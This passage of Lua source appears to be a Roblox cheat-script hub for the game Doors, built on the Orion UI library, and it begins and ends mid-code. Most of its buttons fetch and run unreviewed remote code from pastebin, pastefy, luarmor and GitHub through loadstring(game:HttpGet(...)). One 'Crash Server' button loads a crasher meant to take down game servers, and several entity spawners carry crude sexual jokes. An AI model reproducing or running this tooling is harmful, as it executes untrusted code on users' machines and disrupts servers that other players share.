	layDownAndPlayAnimation() -- Lay down and play the Freakylay animation
	wait(0)
	loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
	game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.One, false, game)
	game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.One, false, game)
end





Tab:AddButton({
	Name = "Lay Down Jerking",
	Callback = function()
		lay()
	end    
})


Tab:AddButton({
	Name = "Stop Jerking",
	Callback = function()
		stop()
	end    
})


Tab:AddButton({
	Name = "GF",
	Callback = function()
		function Message(message)
			if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
				local textChannel = TextChatService.TextChannels.RBXGeneral
				textChannel:SendAsync(message)
			else
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
			end
		end
		Message("-gh 63690008 62234425 62724852 451220849 48474294 3992084515 1103003368 376527115")
		Message("-net")

		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/sushi/main/X'),true))()
	end    
})



Tab:AddButton({
	Name = "Sussy GUI",
	Callback = function()

		script_key=unitpoop;
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/002c19202c9946e6047b0c6e0ad51f84.lua"))()
	end    
})







local Tab = Window:MakeTab({
	Name = "Doors Hubs",
	Icon = "rbxassetid://107642772703957",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "MSPaint"
})


local unitpoop = nil



Tab:AddButton({
	Name = "Ms Paint",
	Callback = function()
		loadstring(game:HttpGet("https://pastebin.com/raw/38Jra00x"))()
	end    
})




Tab:AddTextbox({
	Name = "Enter Key",
	Default = "key",
	TextDisappear = true,
	Callback = function(Value)
		unitpoop = Value
	end	  
})


Tab:AddButton({
	Name = "Get Key (CHECK CONSOLE FOR LINK)",
	Callback = function()
		print("https://ads.luarmor.net/get_key?for=-rXJfopyAkrky")
	end    
})









local unitpoop22 = nil


local Section = Tab:AddSection({
	Name = "Astral"
})



Tab:AddButton({
	Name = "Astral",
	Callback = function()
		script_key="unitpoop22";
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/955852b1ca77ce8454cc37e91c40bc33.lua"))()
	end    
})








Tab:AddTextbox({
	Name = "Enter Key",
	Default = "key",
	TextDisappear = true,
	Callback = function(Value)
		unitpoop22 = Value
	end	  
})




Tab:AddButton({
	Name = "Get Key (CHECK CONSOLE FOR LINK)",
	Callback = function()
		print("https://work.ink/1UuR/XuislTmPPCDGJstRSufm")
	end    
})

local Section = Tab:AddSection({
	Name = "LolHax"
})




Tab:AddButton({
	Name = "LolHax V3",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiterz/Release-Lolhax/refs/heads/main/LX%20Doors%20v3.lua"))()
	end    
})








local Section = Tab:AddSection({
	Name = "BlackKing"
})




Tab:AddButton({
	Name = "BlackKing x BobHub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DarkDoorsKing/Doors/main/Main"))()
	end    
})


local Section = Tab:AddSection({
	Name = "LeafHub"
})




Tab:AddButton({
	Name = "LeafHub (Kaiden Shaders)",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/FLOOR-2-DOORS-floor-2-kardian-scripts-leaked-mspaint-Grunberg-s*-18419"))()
	end    
})


local Section = Tab:AddSection({
	Name = "Old MSPaint"
})


Tab:AddButton({
	Name = "Old MSPaint",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
	end    
})











local Tab = Window:MakeTab({
	Name = "> Doors Features",
	Icon = "rbxassetid://0",
	PremiumOnly = false
})



local Section = Tab:AddSection({
	Name = "Features"
})




Tab:AddButton({
	Name = "Crash Server (REQUIRES ADMIN PANNEL!!!)",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/Scripts/refs/heads/main/doors/crasher.luau"))() -- ADMIN PANNEL NEEDED
	end
})


Tab:AddButton({
	Name = "Auto A-1000",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DaRealGeo/roblox/master/rooms-autowalk"))()
	end

})


Tab:AddButton({
	Name = "Advanced HealthBar",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAcceleration/Comet-Development/refs/heads/main/Doors/Game/PlayerHealthbars.lua"))()
	end
})


Tab:AddLabel("---------------------------------------")
local title = nil
local desc = nil
local reason = nil
local imageid = nil


Tab:AddButton({
	Name = "Custom Achievment",
	Callback = function()
		---====== Load achievement giver ======---
		local achievementGiver = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Achievements/Source.lua"))()

		---====== Display achievement ======---
		achievementGiver({
			Title = title,
			Desc = desc,
			Reason = reason,
			Image = "rbxassetid://" .. imageid
		})	end
})


Tab:AddTextbox({
	Name = "Title",
	Default = " ",
	TextDisappear = true,
	Callback = function(Value)
		title = Value
	end	  
})

Tab:AddTextbox({
	Name = "Description",
	Default = " ",
	TextDisappear = true,
	Callback = function(Value)
		desc = Value
	end	  
})

Tab:AddTextbox({
	Name = "Reason",
	Default = " ",
	TextDisappear = true,
	Callback = function(Value)
		reason = Value
	end	  
})

Tab:AddTextbox({
	Name = "ImageID",
	Default = " ",
	TextDisappear = true,
	Callback = function(Value)
		imageid = Value
	end	  
})

local Section = Tab:AddSection({
	Name = "Entity Spawners"
})



Tab:AddButton({
	Name = "Plamen's EntitySpawner",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/plamen6789/UtilitiesHub/main/UtilitiesGUI'))()
	end
})




Tab:AddButton({
	Name = "Entity Plushies SpawnerHub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/cokroache/Cokroaches-FattyHub/refs/heads/main/EntityPlushSpawnerHub"))()
		OrionLib:MakeNotification({
			Name = "FattyHubPlushySpawner CMDS:",
			Content = "E,R,T,Y,U,F,G,H",
			Image = "rbxassetid://107642772703957",
			Time = 7
		})
	end
	
})



Tab:AddButton({
	Name = "Grace Entities",
	Callback = function()
		_G.GraceMonstersSettings = {

			ExperimentalSettings = {
				ShowRushNodes = false
			},

			CrucifixSettings = {
				Material = Enum.Material.Neon,
				Color = Color3.fromRGB(134, 156, 253),
				Infinite = false
			},

			MonsterSettings = {
				FollowRushNodes = false --works for carnation and slugfish only
				--and might be buggy and can cause carnation/slugfish to rotate in random directions
			},

			CarnationSettings = {
				sDelay = 5,
				Speed = 100,
				Damage = 135,
				HitboxSize = 25,
				RequiredHidingSpotsToSpawn = 3
			},

			SlugfishSettings = {
				sDelay = 5,
				Speed = 250,
				Damage = 200,
				HitboxSize = 10,
				RequiredHidingSpotsToSpawn = 0
			},

			BloodRain = {
				RemoveCeilings = true
			}
		}

		loadstring(game:HttpGet("https://raw.githubusercontent.com/IdkMyNameLoll/PublicScripts/refs/heads/main/GraceEntitiesScript"))()
	end

})




Tab:AddButton({
	Name = "Grumble (PRESS Q/H TO SPAWN)",
	Callback = function()

		local UserInputService = game:GetService("UserInputService")

		local GrumbosFolder = Instance.new("Folder")
		GrumbosFolder.Parent = workspace
		GrumbosFolder.Name ="GrumbosFolder"


		UserInputService.InputBegan:Connect(function(input, gP)
			if input.KeyCode == Enum.KeyCode.H and not gP then
				local files = game.Workspace:WaitForChild("GrumbosFolder")
				files:ClearAllChildren()
			end
		end)


		-- GRUMBLE SPAWNER 
		--Q TO SPAWN

		local Speed = 12

		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local Debris = game:GetService("Debris")
		local UserInputService = game:GetService("UserInputService")

		local Player = Players.LocalPlayer
		local Character = Player.Character or Player.CharacterAdded:Wait()

		local Sword = game:GetObjects("rbxassetid://72674416931709")[1]

		local Cache = game:GetObjects("rbxassetid://96223289630255")[1]
		local Cache2 = game:GetObjects("rbxassetid://103869039972033")[1]

		Cache:Destroy()
		Cache2:Destroy()

		Sword.Parent = Player.Backpack

		task.spawn(function()
			local Tool = Sword
			local Handle = Tool:WaitForChild("Handle")
			local Humanoid = Character.Humanoid
			local Torso = Character:FindFirstChild("Torso") or Character:FindFirstChild("HumanoidRootPart")

			local function Create(ty)
				return function(data)
					local obj = Instance.new(ty)
					for k, v in pairs(data) do
						if type(k) == 'number' then
							v.Parent = obj
						else
							obj[k] = v
						end
					end
					return obj
				end
			end

			local BaseUrl = "rbxassetid://"

			local DamageValues = {
				BaseDamage = 5,
				SlashDamage = 10,
				LungeDamage = 30
			}

			local Animations = {
				R15Slash = 522635514,
				R15Lunge = 522638767
			}

			local Damage = DamageValues.BaseDamage

			local Grips = {
				Up = CFrame.new(0, 0, -1.70000005, 0, 0, 1, 1, 0, 0, 0, 1, 0),
				Out = CFrame.new(0, 0, -1.70000005, 0, 1, 0, 1, -0, 0, 0, 0, -1)
			}

			local Sounds = {
				Slash = Handle:WaitForChild("SwordSlash"),
				Lunge = Handle:WaitForChild("SwordLunge"),
				Unsheath = Handle:WaitForChild("Unsheath")
			}

			local ToolEquipped = false

			Tool.Grip = Grips.Up
			Tool.Enabled = true

			local function IsTeamMate(Player1, Player2)
				return (Player1 and Player2 and not Player1.Neutral and not Player2.Neutral and Player1.TeamColor == Player2.TeamColor)
			end

			local function TagHumanoid(humanoid, player)
				local Creator_Tag = Instance.new("ObjectValue")
				Creator_Tag.Name = "creator"
				Creator_Tag.Value = player
				Debris:AddItem(Creator_Tag, 2)
				Creator_Tag.Parent = humanoid
			end

			local function UntagHumanoid(humanoid)
				for i, v in pairs(humanoid:GetChildren()) do
					if v:IsA("ObjectValue") and v.Name == "creator" then
						v:Destroy()
					end
				end
			end

			local function CheckIfAlive()
				return (((Player and Player.Parent and Character and Character.Parent and Humanoid and Humanoid.Parent and Humanoid.Health > 0 and Torso and Torso.Parent) and true) or false)
			end

			local function Blow(Hit)
				if not Hit or not Hit.Parent or not CheckIfAlive() or not ToolEquipped then
					return
				end
				local RightArm = Character:FindFirstChild("Right Arm") or Character:FindFirstChild("RightHand")
				if not RightArm then
					return
				end
				local RightGrip = RightArm:FindFirstChild("RightGrip")
				if not RightGrip or (RightGrip.Part0 ~= Handle and RightGrip.Part1 ~= Handle) then
					return
				end
				local character = Hit.Parent
				if character == Character then
					return
				end
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health == 0 then
					return
				end
				local player = Players:GetPlayerFromCharacter(character)
				if player and (player == Player or IsTeamMate(Player, player)) then
					return
				end
				UntagHumanoid(humanoid)
				TagHumanoid(humanoid, Player)
				humanoid:TakeDamage(Damage)	
			end

			local function Attack()
				Damage = DamageValues.SlashDamage
				Sounds.Slash:Play()

				if Humanoid then
					if Humanoid.RigType == Enum.HumanoidRigType.R6 then
						local Anim = Instance.new("StringValue")
						Anim.Name = "toolanim"
						Anim.Value = "Slash"
						Anim.Parent = Tool
					elseif Humanoid.RigType == Enum.HumanoidRigType.R15 then
						local Anim = Tool:FindFirstChild("R15Slash")
						if Anim then
							local Track = Humanoid:LoadAnimation(Anim)
							Track:Play(0)
						end
					end
				end	
			end

			local function Lunge()
				Damage = DamageValues.LungeDamage

				Sounds.Lunge:Play()

				if Humanoid then
					if Humanoid.RigType == Enum.HumanoidRigType.R6 then
						local Anim = Instance.new("StringValue")
						Anim.Name = "toolanim"
						Anim.Value = "Lunge"
						Anim.Parent = Tool
					elseif Humanoid.RigType == Enum.HumanoidRigType.R15 then
						local Anim = Tool:FindFirstChild("R15Lunge")
						if Anim then
							local Track = Humanoid:LoadAnimation(Anim)
							Track:Play(0)
						end
					end
				end	

				wait(0.2)
				Tool.Grip = Grips.Out
				wait(0.6)
				Tool.Grip = Grips.Up

				Damage = DamageValues.SlashDamage
			end

			Tool.Enabled = true
			local LastAttack = 0

			local function Activated()
				if not Tool.Enabled or not ToolEquipped or not CheckIfAlive() then
					return
				end
				Tool.Enabled = false
				local Tick = RunService.Stepped:wait()
				if (Tick - LastAttack < 0.2) then
					Lunge()
				else
					Attack()
				end
				LastAttack = Tick
				Damage = DamageValues.BaseDamage
				local SlashAnim = (Tool:FindFirstChild("R15Slash") or Create("Animation"){
					Name = "R15Slash",
					AnimationId = BaseUrl .. Animations.R15Slash,
					Parent = Tool
				})

				local LungeAnim = (Tool:FindFirstChild("R15Lunge") or Create("Animation"){
					Name = "R15Lunge",
					AnimationId = BaseUrl .. Animations.R15Lunge,
					Parent = Tool
				})
				Tool.Enabled = true
			end

			local function Equipped()
				if not CheckIfAlive() then
					return
				end
				ToolEquipped = true
				Sounds.Unsheath:Play()
			end

			local function Unequipped()
				Tool.Grip = Grips.Up
				ToolEquipped = false
			end

			Tool.Activated:Connect(Activated)
			Tool.Equipped:Connect(Equipped)
			Tool.Unequipped:Connect(Unequipped)

			Handle.Touched:Connect(Blow)
		end)

		UserInputService.InputBegan:Connect(function(input, gP)
			if input.KeyCode == Enum.KeyCode.Q and not gP then
				local Dummy = game:GetObjects("rbxassetid://96223289630255")[1]
				local Grumbo = game:GetObjects("rbxassetid://103869039972033")[1]

				Dummy.Parent = workspace.GrumbosFolder
				Grumbo.Parent = workspace.GrumbosFolder

				Dummy.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame + Vector3.new(math.random(-15, 15), 0, math.random(-15, 15))

				task.wait()

				local Idle = Grumbo.GrumbleRig.AnimationController.Animator:LoadAnimation(Grumbo.GrumbleRig.Idle)
				Idle.Looped = true
				Idle:Play()

				local Blink = Grumbo.GrumbleRig.AnimationController.Animator:LoadAnimation(Grumbo.GrumbleRig.Blink)

				local Stun = Grumbo.GrumbleRig.AnimationController.Animator:LoadAnimation(Grumbo.GrumbleRig.Stun)

				task.spawn(function()
					while Grumbo:IsDescendantOf(workspace.GrumbosFolder) do
						task.wait(math.random(2, 5))
						Blink:Play()
					end
				end)

				local function followPlayer()
					local Direction = (Character.HumanoidRootPart.Position - Dummy.HumanoidRootPart.Position).unit
					Dummy.HumanoidRootPart.Velocity = Direction * Speed
					Dummy.HumanoidRootPart.CFrame = CFrame.new(Dummy.HumanoidRootPart.Position, Character.HumanoidRootPart.Position)
				end

				Dummy.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
					if Dummy.Humanoid.Health <= 0 then
						Stun:Play()
						task.wait(1)
						Dummy:Destroy()
						Grumbo:Destroy()
					end
				end)

				RunService.RenderStepped:Connect(function()
					if Grumbo:IsDescendantOf(workspace.GrumbosFolder) and Dummy:IsDescendantOf(workspace.GrumbosFolder) and Dummy:FindFirstChild("HumanoidRootPart") and Dummy:FindFirstChild("Humanoid").Health > 0 then
						local Distance = (Character.HumanoidRootPart.Position - Dummy.HumanoidRootPart.Position).magnitude

						if Distance <= math.huge then
							followPlayer()
						end

						Grumbo:PivotTo(Dummy.HumanoidRootPart.CFrame)
					end
				end)
			end
		end)
	end    
})

Tab:AddButton({
	Name = "Rush",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Template Entity",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/Rush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 1
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 100,
				Values = {1.5, 20, 0.1, 1} -- Magnitude, Roughness, FadeIn, FadeOut
			},
			Movement = {
				Speed = 100,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = false,
				Type = "Ambush", -- "Blitz"
				Min = 1,
				Max = 1,
				Delay = 2
			},
			Damage = {
				Enabled = false,
				Range = 40,
				Amount = 125
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Guiding", -- "Curious"
				Hints = {"Hmm, Such strange behaviour..", "it seems you have died to rushia..", "hmm", "show me em BALLS... 😈"},
				Cause = "Fatty"
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnSpawned", function()
			print("Entity has spawned")
		end)

		entity:SetCallback("OnStartMoving", function()
			print("Entity has started moving")
		end)

		entity:SetCallback("OnEnterRoom", function(room, firstTime)
			if firstTime == true then
				print("Entity has entered room: ".. room.Name.. " for the first time")
			else
				print("Entity has entered room: ".. room.Name.. " again")
			end
		end)

		entity:SetCallback("OnLookAt", function(lineOfSight)
			if lineOfSight == true then
				print("Player is looking at entity")
			else
				print("Player view is obstructed by something")
			end
		end)

		entity:SetCallback("OnRebounding", function(startOfRebound)
			if startOfRebound == true then
				print("Entity has started rebounding")
			else
				print("Entity has finished rebounding")
			end
		end)

		entity:SetCallback("OnDespawning", function()
			print("Entity is despawning")
		end)

		entity:SetCallback("OnDespawned", function()
			print("Entity has despawned")
		end)

		entity:SetCallback("OnDamagePlayer", function(newHealth)
			if newHealth == 0 then
				print("Entity has killed the player")
			else
				print("Entity has damaged the player")
			end
		end)

--[[

DEVELOPER NOTE:
By overwriting 'CrucifixionOverwrite' the default crucifixion callback will be replaced with your custom callback.

entity:SetCallback("CrucifixionOverwrite", function()
    print("Custom crucifixion callback")
end)

]]--

		---====== Run entity ======---

		entity:Run()
	end    
})



Tab:AddButton({
	Name = "Rush (Die-able)",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Template Entity",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/Rush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 1
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 100,
				Values = {1.5, 20, 0.1, 1} -- Magnitude, Roughness, FadeIn, FadeOut
			},
			Movement = {
				Speed = 100,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = true,
				Type = "Ambush", -- "Blitz"
				Min = 9,
				Max = 10,
				Delay = 2
			},
			Damage = {
				Enabled = true,
				Range = 40,
				Amount = 100
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Guiding", -- "Curious"
				Hints = {"Hmm, Such strange behaviour..", "it seems you have died to rushia..", "hmm", "show me em BALLS... 😈"},
				Cause = "Fatty"
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnSpawned", function()
			print("Entity has spawned")
		end)

		entity:SetCallback("OnStartMoving", function()
			print("Entity has started moving")
		end)

		entity:SetCallback("OnEnterRoom", function(room, firstTime)
			if firstTime == true then
				print("Entity has entered room: ".. room.Name.. " for the first time")
			else
				print("Entity has entered room: ".. room.Name.. " again")
			end
		end)

		entity:SetCallback("OnLookAt", function(lineOfSight)
			if lineOfSight == true then
				print("Player is looking at entity")
			else
				print("Player view is obstructed by something")
			end
		end)

		entity:SetCallback("OnRebounding", function(startOfRebound)
			if startOfRebound == true then
				print("Entity has started rebounding")
			else
				print("Entity has finished rebounding")
			end
		end)

		entity:SetCallback("OnDespawning", function()
			print("Entity is despawning")
		end)

		entity:SetCallback("OnDespawned", function()
			print("Entity has despawned")
		end)

		entity:SetCallback("OnDamagePlayer", function(newHealth)
			if newHealth == 0 then
				print("Entity has killed the player")
			else
				print("Entity has damaged the player")
			end
		end)

--[[

DEVELOPER NOTE:
By overwriting 'CrucifixionOverwrite' the default crucifixion callback will be replaced with your custom callback.

entity:SetCallback("CrucifixionOverwrite", function()
    print("Custom crucifixion callback")
end)

]]--

		---====== Run entity ======---

		entity:Run()
	end    
})


Tab:AddButton({
	Name = "Blitz",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Blitz Example",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/BackdoorRush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 1
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 100,
				Values = {1.5, 20, 0.1, 1}
			},
			Movement = {
				Speed = 100,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = true,
				Type = "Blitz",
				Min = 1,
				Max = math.random(1, 2),
				Delay = math.random(10, 30) / 10
			},
			Damage = {
				Enabled = false,
				Range = 40,
				Amount = 99.9
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Curious",
				Hints = {"Oh... Aych.", "I expected to see you here.", "Let's see what you died to.", "Oh, one of my favorites.", "Fatty said we should call that one Blitz.", "Well... I'll see you later, right? You'll come back? Oh shit, i needa poo, hol up jit, ima poo rq alr?", "Lowk, my balls kinda hurt."},
				Cause = ""
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnRebounding", function(startOfRebound)
			-- Variables for the entity
			local entityModel = entity.Model
			local main = entityModel:WaitForChild("Main")
			local attachment = main:WaitForChild("Attachment")
			local AttachmentSwitch = main:WaitForChild("AttachmentSwitch")
			local sounds = {
				footsteps = main:WaitForChild("Footsteps"),
				playSound = main:WaitForChild("PlaySound"),
				switch = main:WaitForChild("Switch"),
				switchBack = main:WaitForChild("SwitchBack")
			}

			-- Toggle particle emitters and lights within the entityModel
			-- To switch between green & red state
			for _, c in attachment:GetChildren() do
				c.Enabled = (not startOfRebound)
			end
			for _, c in AttachmentSwitch:GetChildren() do
				c.Enabled = startOfRebound
			end

			-- Play sounds
			if startOfRebound == true then
				sounds.footsteps.PlaybackSpeed = 0.35
				sounds.playSound.PlaybackSpeed = 0.25
				sounds.switch:Play()
			else
				sounds.footsteps.PlaybackSpeed = 0.25
				sounds.playSound.PlaybackSpeed = 0.16
				sounds.switchBack:Play()
			end
		end)

		---====== Run entity ======---

		entity:Run()
	end    
})





Tab:AddButton({
	Name = "Blitz (deading)",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Blitz Example",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/BackdoorRush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 1
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 100,
				Values = {1.5, 20, 0.1, 1}
			},
			Movement = {
				Speed = 100,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = true,
				Type = "Blitz",
				Min = 1,
				Max = math.random(1, 2),
				Delay = math.random(10, 30) / 10
			},
			Damage = {
				Enabled = true,
				Range = 40,
				Amount = 99.9
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Curious",
				Hints = {"Oh... Aych.", "I expected to see you here.", "Let's see what you died to.", "Oh, one of my favorites.", "Fatty said we should call that one Blitz.", "Well... I'll see you later, right? You'll come back? Oh shit, i needa poo, hol up jit, ima poo rq alr?", "Lowk, my balls kinda hurt."},
				Cause = ""
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnRebounding", function(startOfRebound)
			-- Variables for the entity
			local entityModel = entity.Model
			local main = entityModel:WaitForChild("Main")
			local attachment = main:WaitForChild("Attachment")
			local AttachmentSwitch = main:WaitForChild("AttachmentSwitch")
			local sounds = {
				footsteps = main:WaitForChild("Footsteps"),
				playSound = main:WaitForChild("PlaySound"),
				switch = main:WaitForChild("Switch"),
				switchBack = main:WaitForChild("SwitchBack")
			}

			-- Toggle particle emitters and lights within the entityModel
			-- To switch between green & red state
			for _, c in attachment:GetChildren() do
				c.Enabled = (not startOfRebound)
			end
			for _, c in AttachmentSwitch:GetChildren() do
				c.Enabled = startOfRebound
			end

			-- Play sounds
			if startOfRebound == true then
				sounds.footsteps.PlaybackSpeed = 0.35
				sounds.playSound.PlaybackSpeed = 0.25
				sounds.switch:Play()
			else
				sounds.footsteps.PlaybackSpeed = 0.25
				sounds.playSound.PlaybackSpeed = 0.16
				sounds.switchBack:Play()
			end
		end)

		---====== Run entity ======---

		entity:Run()
	end    
})





Tab:AddButton({
	Name = "Ambush",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Template Entity",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/Ambush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 5
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 100,
				Values = {20, 20, 20, 20} -- Magnitude, Roughness, FadeIn, FadeOut
			},
			Movement = {
				Speed = 200,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = true,
				Type = "Ambush", -- "Blitz"
				Min = 3,
				Max = 5,
				Delay = 2
			},
			Damage = {
				Enabled = false,
				Range = 40,
				Amount = 125
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Guiding", -- "Curious"
				Hints = {"Hmm, Such strange behaviour..", "it seems you have died to ambush..", "hmm", "show me em BALLS... 😈"},
				Cause = "Fatty"
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnSpawned", function()
			print("Entity has spawned")
		end)

		entity:SetCallback("OnStartMoving", function()
			print("Entity has started moving")
		end)

		entity:SetCallback("OnEnterRoom", function(room, firstTime)
			if firstTime == true then
				print("Entity has entered room: ".. room.Name.. " for the first time")
			else
				print("Entity has entered room: ".. room.Name.. " again")
			end
		end)

		entity:SetCallback("OnLookAt", function(lineOfSight)
			if lineOfSight == true then
				print("Player is looking at entity")
			else
				print("Player view is obstructed by something")
			end
		end)

		entity:SetCallback("OnRebounding", function(startOfRebound)
			if startOfRebound == true then
				print("Entity has started rebounding")
			else
				print("Entity has finished rebounding")
			end
		end)

		entity:SetCallback("OnDespawning", function()
			print("Entity is despawning")
		end)

		entity:SetCallback("OnDespawned", function()
			print("Entity has despawned")
		end)

		entity:SetCallback("OnDamagePlayer", function(newHealth)
			if newHealth == 0 then
				print("Entity has killed the player")
			else
				print("Entity has damaged the player")
			end
		end)

--[[

DEVELOPER NOTE:
By overwriting 'CrucifixionOverwrite' the default crucifixion callback will be replaced with your custom callback.

entity:SetCallback("CrucifixionOverwrite", function()
    print("Custom crucifixion callback")
end)

]]--

		---====== Run entity ======---

	entity:Run()
end
})




Tab:AddButton({
	Name = "Ambush (Die)",
	Callback = function()
		---====== Load spawner ======---

		local spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Entity%20Spawner/V2/Source.lua"))()

		---====== Create entity ======---

		local entity = spawner.Create({
			Entity = {
				Name = "Template Entity",
				Asset = "https://github.com/RegularVynixu/Utilities/raw/main/Doors/Entity%20Spawner/Assets/Entities/Ambush.rbxm",
				HeightOffset = 0
			},
			Lights = {
				Flicker = {
					Enabled = true,
					Duration = 5
				},
				Shatter = true,
				Repair = false
			},
			Earthquake = {
				Enabled = false
			},
			CameraShake = {
				Enabled = true,
				Range = 1000,
				Values = {20, 20, 20, 20} -- Magnitude, Roughness, FadeIn, FadeOut
			},
			Movement = {
				Speed = 500,
				Delay = 2,
				Reversed = false
			},
			Rebounding = {
				Enabled = true,
				Type = "Ambush", -- "Blitz"
				Min = 3,
				Max = 5,
				Delay = 2
			},
			Damage = {
				Enabled = true,
				Range = 40,
				Amount = 100
			},
			Crucifixion = {
				Enabled = true,
				Range = 40,
				Resist = false,
				Break = true
			},
			Death = {
				Type = "Curious", -- "Curious"
				Hints = {"Congrats Fatty, You died to a green egg", "Now ima have to jiggle dem balls 😈", "clap clap.",  "clap clap..." },
				Cause = "Fatty"
			}
		})

		---====== Debug entity ======---

		entity:SetCallback("OnSpawned", function()
			print("Entity has spawned")
		end)

		entity:SetCallback("OnStartMoving", function()
			print("Entity has started moving")
		end)

		entity:SetCallback("OnEnterRoom", function(room, firstTime)
			if firstTime == true then
				print("Entity has entered room: ".. room.Name.. " for the first time")
			else
				print("Entity has entered room: ".. room.Name.. " again")
			end
		end)

		entity:SetCallback("OnLookAt", function(lineOfSight)
			if lineOfSight == true then
				print("Player is looking at entity")
			else
				print("Player view is obstructed by something")
			end
		end)

		entity:SetCallback("OnRebounding", function(startOfRebound)
			if startOfRebound == true then
				print("Entity has started rebounding")
			else
				print("Entity has finished rebounding")
			end
		end)

		entity:SetCallback("OnDespawning", function()
			print("Entity is despawning")
		end)

		entity:SetCallback("OnDespawned", function()
			print("Entity has despawned")
		end)

		entity:SetCallback("OnDamagePlayer", function(newHealth)
			if newHealth == 0 then
				print("Entity has killed the player")
			else
				print("Entity has damaged the player")
			end
		end)

--[[

